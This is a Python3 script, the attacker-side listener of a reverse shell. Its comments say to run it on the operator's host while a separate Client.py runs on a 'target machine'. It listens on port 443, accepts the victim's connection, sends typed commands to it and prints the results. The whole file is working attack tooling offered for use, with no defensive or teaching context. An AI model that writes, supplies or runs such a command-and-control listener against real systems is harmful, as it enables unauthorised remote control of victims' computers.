#!/usr/bin/env python3

# Reverse Shell Writeen by NOCH in Python3 #
# Run this server listener on HOST, then execute Client.py on target machine #

import socket
import os

# Initialisation of listening IP, port and buffer size
SERVER_HOST = "0.0.0.0"	# CHANGE ME
SERVER_PORT = 443	# CHANGE ME
BUFFER_SIZE = 4096	# Send 4KB at a time

print("\n...NOCH's Python3 Reverse Shell...\n")

# Create socket object "server"
server = socket.socket()

# Check permission & bind socket object to IP & PORT
try:
	server.bind((SERVER_HOST, SERVER_PORT))
except PermissionError:
	print("Run as Root!\n")
	os._exit(0)

# Listen for incoming connections
server.listen(5)
listening = "[+] Server Listening on {0}:{1}".format(SERVER_HOST, SERVER_PORT)
print(listening)

# Accept incoming connections
client_conn, client_addr = server.accept()
connection = "[+] {0}:{1} Connected Successfully.".format(client_addr[0], client_addr[1])
print(connection)

# Shell commands loop
while True:

	# Command input
	cmd = input("> ")

	# Send to client
	client_conn.send(cmd.encode())

	# Break if command is "exit"	
	if cmd.upper() == "EXIT":
		break

	# Print command output
	result = client_conn.recv(BUFFER_SIZE).decode()
	print(result)

# Terminate connection
client_conn.close()
server.close()
